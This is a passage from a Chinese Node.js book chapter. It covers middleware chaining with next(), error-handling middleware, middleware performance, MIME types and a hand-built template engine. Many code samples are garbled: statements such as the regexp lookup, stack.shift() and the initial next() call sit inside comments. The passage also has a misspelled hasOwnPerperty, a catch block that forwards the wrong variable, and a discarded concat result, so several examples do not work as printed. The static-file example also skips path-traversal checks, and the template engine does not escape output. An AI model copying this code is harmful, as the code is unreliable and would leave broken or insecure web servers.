<p>由于中间件就是前述的那些基本功能，所以它的上下文也就是请求对象和响应对象：req和res。有一点区别的是，由于Node异步的原因，我们需要提供一种机制，在当前中间件处理完成后，通知下一个中间件执行。在第4章中其实已经对中间件做了介绍，这里我们还是采用Connect的设计，通过尾触发的方式实现。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.use = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> handle = &#123; <span class="comment">// 第一个参数作为路径</span></div><div class="line">    path: pathRegexp(path), <span class="comment">// 其他的都是处理单元</span></div><div class="line">    stack: <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>)</div><div class="line">  &#125;;</div><div class="line">  routes.all.push(handle);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>改进后的use()方法将中间件都存进了stack数组中保存，等待匹配后触发执行。由于结构发生改变，那么我们的匹配部分也需要进行修改，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> match = <span class="function"><span class="keyword">function</span> (<span class="params">pathname, routes</span>) </span>&#123;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; routes.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> route = routes[i];</div><div class="line">    <span class="comment">// 正则匹配 var reg = route.path.regexp;</span></div><div class="line">    <span class="keyword">var</span> matched = reg.exec(pathname);</div><div class="line">    <span class="keyword">if</span> (matched) &#123;</div><div class="line">      <span class="comment">// 抽取具体值 // 代码省略</span></div><div class="line">      <span class="comment">// 将中间件数组交给handle()方法处理</span></div><div class="line">      handle(req, res, route.stack);</div><div class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>一旦匹配成功，中间件具体如何调动都交给了handle()方法处理，该方法封装后，递归性地执行数组中的中间件，每个中间件执行完成后，按照约定调用传入next()方法以触发下一个中间件执行（或者直接响应），直到最后的业务逻</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res, stack</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> next = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// 从stack数组中取出中间件并执行</span></div><div class="line">    <span class="keyword">var</span> middleware = stack.shift();</div><div class="line">    <span class="keyword">if</span> (middleware) &#123;</div><div class="line">      <span class="comment">// 传入next()函数自身，使中间件能够执行结束后递归</span></div><div class="line">      middleware(req, res, next);</div><div class="line">    &#125;</div><div class="line">  &#125;;</div><div class="line">  <span class="comment">// 启动执行</span></div><div class="line">  next();</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这里带来的疑问是，像querystring、cookie、session这样基础的功能中间件是否需要为每个路由都进行设置呢？如果都设置将会演变成如下的路由配置：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.get(<span class="string">'/user/:username'</span>, querystring, cookie, session, getUser);</div><div class="line">app.put(<span class="string">'/user/:username'</span>, querystring, cookie, session, updateUser);</div><div class="line"><span class="comment">//</span></div></pre></td></tr></table></figure>
<p>更多路由为每个路由都配置中间件并不是一个好的设计，既然中间件和业务逻辑是等价的，那么我们是否可以将路由和中间件进行结合？设计是否可以更人性？既能照顾普适的需求，又能照顾特殊的需求？答案是Yes，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.use(querystring);</div><div class="line">app.use(cookie); app.use(session);</div><div class="line">app.get(<span class="string">'/user/:username'</span>, getUser); app.put(<span class="string">'/user/:username'</span>, authorize,updateUser);</div></pre></td></tr></table></figure>
<p>为了满足更灵活的设计，这里持续改进我们的use()方法以适应参数的变化，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.use = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> handle;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> path === <span class="string">'string'</span>) &#123;</div><div class="line">    handle = &#123;</div><div class="line">      <span class="comment">// 第一个参数作为路径 path: pathRegexp(path),</span></div><div class="line">      <span class="comment">// 其他的都是处理单元 stack:</span></div><div class="line">      <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>)</div><div class="line">    &#125;;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    handle = &#123; <span class="comment">// 第一个参数作为路径</span></div><div class="line">      path: pathRegexp(<span class="string">'/'</span>), <span class="comment">// 其他的都是处理单元</span></div><div class="line">      stack: <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">0</span>)</div><div class="line">    &#125;;</div><div class="line">  &#125;</div><div class="line">  routes.all.push(handle);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>除了改进use()方法外，还要持续改进我们的匹配过程，与前面一旦一次匹配后就不再执行后续匹配不同，还会继续后续逻辑，这里我们将所有匹配到中间件的都暂时保存起来，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> match = <span class="function"><span class="keyword">function</span> (<span class="params">pathname, routes</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> stacks = [];</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; routes.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> route = routes[i];</div><div class="line">    <span class="comment">// 正则匹配 var reg = route.path.regexp;</span></div><div class="line">    <span class="keyword">var</span> matched = reg.exec(pathname);</div><div class="line">    <span class="keyword">if</span> (matched) &#123;</div><div class="line">      <span class="comment">// 抽取具体值 // 代码省略</span></div><div class="line">      <span class="comment">// 将中间件都保存起来 stacks = stacks.concat(route.stack);</span></div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> stacks;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>改进完use()方法后，还要持续改进分发的过程：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> pathname = url.parse(req.url).pathname; <span class="comment">// 将请求方法变为小写</span></div><div class="line">  <span class="keyword">var</span> method = req.method.toLowerCase(); <span class="comment">// 获取all()方法里的中间件</span></div><div class="line">  <span class="keyword">var</span> stacks = match(pathname, routes.all);</div><div class="line">  <span class="keyword">if</span> (routes.hasOwnPerperty(method)) &#123;</div><div class="line">    <span class="comment">// 根据请求方法分发，获取相关的中间件 stacks.concat(match(pathname,</span></div><div class="line">    routes[method]));</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (stacks.length) &#123;</div><div class="line">  handle(req, res, stacks);</div><div class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 处理404请求</span></div><div class="line">  handle404(req, res);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>综上所述，通过中间件和路由的协作，我们不知不觉之间已经将复杂的事情简化下来，Web应用开发者可以只关注业务开发就能胜任整个开发工作。</p>
<h3 id="8-4-1-异常处理"><a href="#8-4-1-异常处理" class="headerlink" title="8.4.1 异常处理"></a>8.4.1 异常处理</h3><p>异常处理<br>但是等等，如果某个中间件出现错误该怎么办？我们需要为自己构建的Web应用的稳定性和健壮性负责。于是我们为next()方法添加err参数，并捕获中间件直接抛出的同步异常，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res, stack</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> next = <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (err) &#123;</div><div class="line">      <span class="keyword">return</span> handle500(err, req, res, stack);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 从stack数组中取出中间件并执行 var middleware = stack.shift();</span></div><div class="line">    <span class="keyword">if</span> (middleware) &#123; <span class="comment">// 传入next()函数自身，使中间件能够执行结束后递归</span></div><div class="line">      <span class="keyword">try</span> &#123;</div><div class="line">        middleware(req, res, next);</div><div class="line">      &#125; <span class="keyword">catch</span> (ex) &#123;</div><div class="line">        next(err);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;;</div><div class="line">  <span class="comment">// 启动执行 next();</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">var</span> session = <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> id = req.cookies.sessionid;</div><div class="line">  store.get(id, <span class="function"><span class="keyword">function</span> (<span class="params">err, session</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (err) &#123; <span class="comment">// 将异常通过next()传递</span></div><div class="line">      <span class="keyword">return</span> next(err);</div><div class="line">    &#125;</div><div class="line">    req.session = session;</div><div class="line">    next();</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>Next()方法接到异常对象后，会将其交给handle500()进行处理。为了将中间件的思想延续下去，我们认为进行异常处理的中间件也是能进行数组式处理的。由于要同时传递异常，所以用于处理异常的中间件的设计与普通中间件略有差别，它的参数有4个，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> middleware = <span class="function"><span class="keyword">function</span> (<span class="params">err, req,res, next</span>) </span>&#123;</div><div class="line"><span class="comment">// TODO next();</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我们通过use()可以将所有异常处理的中间件注册起来，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">err, req, res, next</span>) </span>&#123; </div><div class="line">  <span class="comment">// TODO</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>为了区分普通中间件和异常处理中间件，handle500()方法将会对中间件按参数进行进行选取，然后递归执行。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle500 = <span class="function"><span class="keyword">function</span> (<span class="params">err, req, res, stack</span>) </span>&#123; <span class="comment">// 选取异常处理中间件</span></div><div class="line">  stack = stack.filter(<span class="function"><span class="keyword">function</span> (<span class="params">middleware</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> middleware.length === <span class="number">4</span>;</div><div class="line">  &#125;);</div><div class="line">  <span class="keyword">var</span> next = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// 从stack数组中取出中间件并执行</span></div><div class="line">    <span class="keyword">var</span> middleware = stack.shift();</div><div class="line">    <span class="keyword">if</span> (middleware) &#123;</div><div class="line">      <span class="comment">// 传递异常对象 middleware(err, req, res, next);</span></div><div class="line">    &#125;</div><div class="line">  &#125;;</div><div class="line">  <span class="comment">// 启动执行</span></div><div class="line">  next();</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="8-4-2-中间件与性能"><a href="#8-4-2-中间件与性能" class="headerlink" title="8.4.2 中间件与性能"></a>8.4.2 中间件与性能</h3><h3 id="中间件与性能"><a href="#中间件与性能" class="headerlink" title="中间件与性能"></a>中间件与性能</h3><p>前文我们添加了强大的中间件组织能力，如果注意到一个现象的话，那就是我们的业务逻辑往往是在最后才执行。为了让业务逻辑提早执行，尽早响应给终端用户，中间件的编写和使用是需要一番考究的。下面是两个主要的能提升的点。编写高效的中间件。<br>合理利用路由，避免不必要的中间件执行。</p>
<h3 id="编写高效的中间件"><a href="#编写高效的中间件" class="headerlink" title="编写高效的中间件"></a>编写高效的中间件</h3><p>编写高效的中间件其实就是提升单个处理单元的处理速度，以尽早调用next()执行后续逻辑。需要知道的事情是，一旦中间件被匹配，那么每个请求都会使该中间件执行一次，哪怕它只浪费1毫秒的执行时间，都会让我们的QPS显著下降。常见的优化方法有几种。</p>
<p>使用高效的方法。必要时通过<code>jsperf.com</code>测试基准性能。<br>缓存需要重复计算的结果（需要控制缓存用量，原因在第5章阐述过）。避免不必要的计算。比如HTTP报文体的解析，对于GET方法完全不需要。</p>
<p>合理使用路由<br>在拥有一堆高效的中间件后，并不意味着每个中间件我们都使用，合理的路由使得不必要的中间件不参与请求处理的过程。这里以一个示例来说明该问题。假设我们这里有一个静态文件的中间件，它会对请求进行判断，如果磁盘上存在对应文件，就响应对应的静态文件，否则就交由下游中间件处理，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> staticFile = <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> pathname = url.parse(req.url).pathname;</div><div class="line">  fs.readFile(path.join(ROOT, pathname), <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (err) &#123;</div><div class="line">      <span class="keyword">return</span> next();</div><div class="line">    &#125;</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(file);</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>如果我们以如下的方式注册路由：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.use(staticFile);</div></pre></td></tr></table></figure></p>
<p>那么意味着对/路径下的所有URL请求都会进行判断。又由于它中间涉及到了磁盘I/O，如果成功匹配，它的效率还行，但是如果不成功匹配，每次的磁盘I/O都是对性能的浪费，使QPS直线下降。</p>
<p>对于这种情况，我们需要做的是提升匹配成功率，那么就不能使用默认的/路径来进行匹配了，因为它的误伤率太高。给它添加一个更好的路由路径是个不错的选择，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">app.use(<span class="string">'/public'</span>, staticFile);</div></pre></td></tr></table></figure>
<p>这样只有/public路径会匹配上，其余路径根本不会涉及该中间件。</p>
<h3 id="8-4-3-小结"><a href="#8-4-3-小结" class="headerlink" title="8.4.3 小结"></a>8.4.3 小结</h3><p>中间件使得前文的基础功能，从凌乱的发散状态收敛成很规整的组织方式。对于单个中间件而言，它足够简单，职责单一。与像面条一样杂糅在一起的逻辑判断相比，它具备更好的可测试性。中间件机制使得Web应用具备良好的可扩展性和可组合性，可以轻易地进行数据增删。从某种角度来讲它就是Unix哲学的一个实现，专注简单，小而美，然后通过组合使用，发挥出强大的能</p>
<p>中间件是Connect的经典模式，通过本节的叙述，我们已经可以看到整个Connect是如何搭建轮廓的。本节试图解释Web开发过程的前置思路，省略了许多细节，尽管与实际的Connect代码不尽相同，希望借着这些思路，每位开发者都能独立写出适应自己业务需求的框架。</p>
<h2 id="8-5-页面渲染"><a href="#8-5-页面渲染" class="headerlink" title="8.5 页面渲染"></a>8.5 页面渲染</h2><h3 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h3><p>通过中间件机制组织基础功能完成我们的请求预处理后，不管是通过MVC还是通过RESTful路由，开发者或者是调用了数据库，或者是进行了文件操作，或者是处理了内存，这时我们终于来到了响应客户端的部分了。这里的“页面渲染”是个狭义的标题，我们其实响应的可能是一个HTML网页，也可能是CSS、JS文件，或者是其他多媒体文件。这里我们要承接上文谈论的HTTP响应实现的技术细节，主要包含内容响应和页面渲染两个部分。</p>
<p>对于过去流行的ASP、PHP、JSP等动态网页技术，页面渲染是一种内置的功能。但对于Node来说，它并没有这样的内置功能，在本节的介绍中，你会看到正是因为标准功能的缺失，我们可以更贴近底层，发展出更多更好的渲染技术，社区的创造力使得Node在HTTP响应上呈现出更加丰富多彩的状态。</p>
<h3 id="8-5-1-内容响应"><a href="#8-5-1-内容响应" class="headerlink" title="8.5.1 内容响应"></a>8.5.1 内容响应</h3><h3 id="内容响应"><a href="#内容响应" class="headerlink" title="内容响应"></a>内容响应</h3><p>在第7章我们介绍了http模块封装了对请求报文和响应报文的操作，在这里我们则展开说明应用层该如何使用响应的封装。服务器端响应的报文，最终都要被终端处理。这个终端可能是命令行终端，也可能是代码终端，也可能是浏览器。服务器端的响应从一定程度上决定或指示了客户端该如何处理响应的内容。内容响应的过程中，响应报头中的Content-*字段十分重要。在下面的示例响应报文中，服务端告知客户端内容是以gzip编码的，其内容长度为21 170个字节，内容类型为JavaScript，字符集为UTF-8：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Content-Encoding: gzip </div><div class="line">Content-Length: 21170</div><div class="line">Content-Type: text/javascript; </div><div class="line">charset=utf-8</div></pre></td></tr></table></figure>
<p>客户端在接收到这个报文后，正确的处理过程是通过gzip来解码报文体中的内容，用长度校验报文体内容是否正确，然后再以字符集UTF-8将解码后的脚本插入到文档节点中。</p>
<h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><p>如果想要客户端用正确的方式来处理响应内容，了解MIME必不可少。可以先猜想一下下面两段代码在客户端会有什么样的差异：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</div><div class="line">res.end(<span class="string">'&lt;html&gt;&lt;body&gt;Hello World&lt;/body&gt;&lt;/html&gt;\n'</span>); </div><div class="line"></div><div class="line"><span class="comment">// 或者</span></div><div class="line">res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);</div><div class="line">res.end(<span class="string">'&lt;html&gt;&lt;body&gt;Hello World&lt;/body&gt;&lt;/html&gt;\n'</span>);</div></pre></td></tr></table></figure>
<p>在网页中，前者显示的是</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>Hello</div><div class="line">World<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>，</div></pre></td></tr></table></figure>
<p>而后者只能看到Hello World，如图8-5所示。</p>
<p>没错，引起上述差异的原因就在于它们的<code>Content-Type</code>字段的值是不同的。浏览器对内容采用了不同的处理方式，前者为纯文本，后者为HTML，并渲染了DOM树。浏览器正是通过不同的<code>Content-Type</code>的值来决定采用不同的渲染方式，这个值我们简称为MIME值。</p>
<p>MIME的全称是<code>Multipurpose Internet Mail Extensions</code>，从名字可以看出，它最早用于电子邮件，后来也应用到浏览器中。不同的文件类型具有不同的MIME值，如JSON文件的值为<code>application/json</code>、XML文件的值为<code>application/xml</code>、PDF文件的值为<code>application/pdf</code>。</p>
<p>为了方便获知文件的MIME值，社区有专有的mime模块可以用判段文件类型。它的调用十分简</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> mime = <span class="built_in">require</span>(<span class="string">'mime'</span>);</div><div class="line">mime.lookup(<span class="string">'/path/to/file.txt'</span>); <span class="comment">// =&gt; 'text/plain'</span></div><div class="line">mime.lookup(<span class="string">'file.txt'</span>); <span class="comment">// =&gt; 'text/plain' </span></div><div class="line">mime.lookup(<span class="string">'.TXT'</span>); <span class="comment">// =&gt; 'text/plain'</span></div><div class="line">mime.lookup(<span class="string">'htm'</span>); <span class="comment">// =&gt; 'text/html'</span></div></pre></td></tr></table></figure>
<p>除了MIME值外，Content-Type的值中还可以包含一些参数，如字符集。示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Content-Type: text/javascript; charset=utf-8</div></pre></td></tr></table></figure>
<h3 id="8-5-2-视图渲染"><a href="#8-5-2-视图渲染" class="headerlink" title="8.5.2 视图渲染"></a>8.5.2 视图渲染</h3><p><strong>视图渲染</strong></p>
<p>Web应用的内容响应形式十分丰富，可以是静态文件内容，也可以是其他附件文件，也可以是跳转等。这里我们回到主流的普通的HTML内容的响应上，总称视图渲染。Web应用最终呈现在界面上的内容，都是通过一系列的视图渲染呈现出来的。在动态页面技术中，最终的视图是由模板和数据共同生成出来的。模板是带有特殊标签的HTML片段，通过与数据的渲染，将数据填充到这些特殊标签中，最后生成普通的带数据的HTML片段。</p>
<h3 id="8-5-3-模板"><a href="#8-5-3-模板" class="headerlink" title="8.5.3 模板"></a>8.5.3 模板</h3><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>最早的服务器端动态页面开发，是在CGI程序或servlet中输出HTML片段，通过网络流输出到客户端，客户端将其渲染到用户界面上。</p>
<p>这种逻辑代码与HTML输出的代码混杂在一起的开发方式，导致一个小小的UI改动都要大动干戈，甚至需要重新编译。为了改良这种情况，使HTML与逻辑代码分离开来，催生出一些服务器端动态网页技术，如ASP、PHP、JSP。</p>
<p>它们将动态语言部分通过特殊的标签（ASP和JSP以<code>&lt;% %&gt;</code>作为标志，PHP则以<code>&lt;? ?&gt;</code>作为标志）包含起来，通过HTML和模板标签混排，将开发者从输出HTML的工作中解脱出来。这样的方法虽然一定程度上减轻了开发维护的难度，但是页面里还是充斥着大量的逻辑代码。这催生了MVC在动态网页技术中的发展，MVC将逻辑、显示、数据分离开来的方式，大大提高了项目的可维护性。其中模板技术就在这样的发展中逐渐成熟起来的.</p>
<p>尽管模板技术看起来在MVC时期才广泛使用，但不可否认的是如ASP、PHP、JSP，它们其实就是最早的模板技术。模板技术虽然多种多样，但它的实质就是将模板文件和数据通过模板引擎生成最终的HTML代码。形成模板技术的也就如下4个要素:</p>
<ul>
<li>模板语言。</li>
<li>包含模板语言的模板文件。</li>
<li>拥有动态数据的数据对象。</li>
<li>模板引擎。</li>
</ul>
<p>对于ASP、PHP、JSP而言，模板属于服务器端动态页面的内置功能，模板语言就是它们的宿主语言（VBScript、JScript、PHP、Java），模板文件就是以<code>.php</code>、<code>.asp</code>、<code>.jsp</code> 为后缀的文件，模板引擎就是Web容器。<br>这个时期的模板极度依赖上下文，甚至要处理整个HTTP的请求对象。随后模板语言的发展使得模板可以脱离上下文环境，只有数据对象就可以执行。如PHP中的<code>PHPLIB Template</code>和<code>FastTemplate</code>、<code>Java</code>的<code>XSTL</code>，以及<code>Velocity</code>、<code>JDynamiTe</code>、<code>Tapestry</code>等模板。</p>
<p><strong>这类模板的缺点在于它的实现与宿主语言有很大的关联性，由于各种语言采用的模板语言不同，包含各种特殊标记，导致移植性较差。早期的企业一旦选定编程语言就不会轻易地转换环境，所以较少有开发者去开发新的模板语言和模板引擎来适应不同的编程语言。如今异构系统越来越多，模板能够应用到多门编程语言中的这种需求也开始呈现出来.</strong> </p>
<p>破局者是Mustache，它宣称自己是<code>弱逻辑的模板</code>（<code>logic-less templates</code>），定义了以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&#123;&#123;&#125;&#125;</div></pre></td></tr></table></figure>
<p>为标志的一套模板语言，并给出了十多门编程语言的模板引擎实现，使得采用它作为模板具备很好的可移植性。但随着Node在社区的发展，思路很快被打开，模板语言可以随意创造，模板引擎也可以随意实现。Node社区目前与模板引擎相关模块的列表差不多要滚3个屏幕才能看完。并且由于Node与前端都采用相同的执行语言JavaScript，所以一套模板语言也无须为它编写两套不同的模板引擎就能轻松地跨前后端共用。</p>
<p>模板和数据与最终结果相比，这里有一个静态、动态的划分过程，相同的模板和不同的数据可以得到不同的结果，不同的模板与相同的数据也能得到不同的结果。模板技术使得网页中的动态内容和静态内容变得不互相依赖，数据开发者与模板开发者只要约定好数据结构</p>
<p>但模板技术并不是什么神秘的技术，它干的实际上是拼接字符串这样很底层的活，只是各种模板有着各自的优缺点和技巧。说模板是拼接字符串并不为过，我们要的就是模板加数据，通过模板引擎的执行就能得到最终的HTML字符串这样结果。</p>
<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>为了演示模板引擎的技术，我们将通过render()方法实现一个简单的模板引擎。这个模板引擎会将Hello &lt;%= username%&gt;转换为”Hello “ + obj.username。该过程进行以下几个步骤。语法分解。提取出普通字符串和表达式，这个过程通常用正则表达式匹配出来，<code>&lt;%=%&gt;</code>的正则表达式为<code>/&lt;%=([\s\S]+?)%&gt;/g</code> 。</p>
<p>处理表达式。将标签表达式转换成普通的语言表达式。</p>
<p>生成待执行的语句。</p>
<p>与数据一起执行，生成最终字符串。</p>
<p>知晓了流程，模板函数就可以轻松愉快地开工了，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> render = <span class="function"><span class="keyword">function</span> (<span class="params">str, data</span>) </span>&#123; <span class="comment">// 模板技术呢，就是替换特殊标签的技术</span></div><div class="line">  <span class="keyword">var</span> tpl = str.replace(<span class="regexp">/&lt;%=([\s\S]+?)%&gt;/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">match, code</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">"' + obj."</span> + code + <span class="string">"+ '"</span>;</div><div class="line">  &#125;);</div><div class="line">  tpl = <span class="string">"var tpl = '"</span> + tpl + <span class="string">"'\nreturn tpl;"</span>;</div><div class="line">  <span class="keyword">var</span> complied = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'obj'</span>, tpl);</div><div class="line">  <span class="keyword">return</span> complied(data);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> tpl = <span class="string">'Hello &lt;%=username%&gt;.'</span>;</div><div class="line"><span class="built_in">console</span>.log(render(tpl, &#123;</div><div class="line">  <span class="attr">username</span>: <span class="string">'Jackson Tian'</span></div><div class="line">&#125;)); <span class="comment">// =&gt; Hello Jackson Tian.</span></div></pre></td></tr></table></figure>
<h3 id="模板编译"><a href="#模板编译" class="headerlink" title="模板编译"></a>模板编译</h3><p>上述代码的实现过程中，可以看到有部分内容前文没有提及，它的内容如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">tpl = <span class="string">"var tpl = '"</span> + tpl + <span class="string">"'\nreturn tpl;"</span>;</div><div class="line"><span class="keyword">var</span> complied = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'obj'</span>, tpl);</div></pre></td></tr></table></figure>
<p>为了能够最终与数据一起执行生成字符串，我们需要将原始的模板字符串转换成一个函数对象。比如Hello &lt;%=username%&gt;这句模板字符串，最终会生成如下的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> tpl = <span class="string">'Hello '</span> + obj.username + <span class="string">'.'</span>;</div><div class="line">  <span class="keyword">return</span> tpl;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个过程称为模板编译，生成的中间函数只与模板字符串相关，与具体的数据无关。如果每次都生成这个中间函数，就会浪费CPU。为了提升模板渲染的性能速度，我们通常会采用模板预编译的方式。是故，上面的代码可以拆解为两个方法，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> complie = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> tpl = str.replace(<span class="regexp">/&lt;%=([\s\S]+?)%&gt;/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">match, code</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">"' + obj."</span> + code + <span class="string">"+ '"</span>;</div><div class="line">  &#125;);</div><div class="line">  tpl = <span class="string">"var tpl = '"</span> + tpl + <span class="string">"'\nreturn tpl;"</span>;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'obj, escape'</span>, tpl);</div><div class="line">&#125;;</div><div class="line"><span class="keyword">var</span> render = <span class="function"><span class="keyword">function</span> (<span class="params">complied, data</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> complied(data);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>通过预编译缓存模板编译后的结果，实际应用中就可以实现一次编译，多次执行，而原始的方式每次执行过程中都要进行一次编译和执行。</p>
<p><strong>with的应用</strong></p>
<p>上面实现的模板引擎非常弱，只能替换变量，&lt;%=”Jackson Tian”%&gt;就无法支持了。为了让它更灵活，我们需要改进它的实现，使字符串能继续表达为字符串，变量能够自动寻找属于它的对象。于是with关键字引入到我们的实现中。with关键字是JavaScript中饱受Douglas Crockford指责的设计，细节在本书附录C中有详细描述。但在这里，with关键字可以得到很方便的应用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> complie = <span class="function"><span class="keyword">function</span> (<span class="params">str, data</span>) </span>&#123;</div><div class="line">  <span class="comment">// 模板技术呢，就是替换特殊标签的技术 </span></div><div class="line">  <span class="keyword">var</span> tpl = str.replace(<span class="regexp">/&lt;%=([\s\S]+?)%&gt;/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">match, code</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">"' + "</span> + code + <span class="string">"+ '"</span>;</div><div class="line">  &#125;);</div><div class="line">  tpl = <span class="string">"tpl = '"</span> + tpl + <span class="string">"'"</span>;</div><div class="line">  tpl = <span class="string">'var tpl = "";\nwith (obj) &#123;'</span> + tpl + <span class="string">'&#125;\nreturn tpl;'</span>;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'obj'</span>, tpl);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
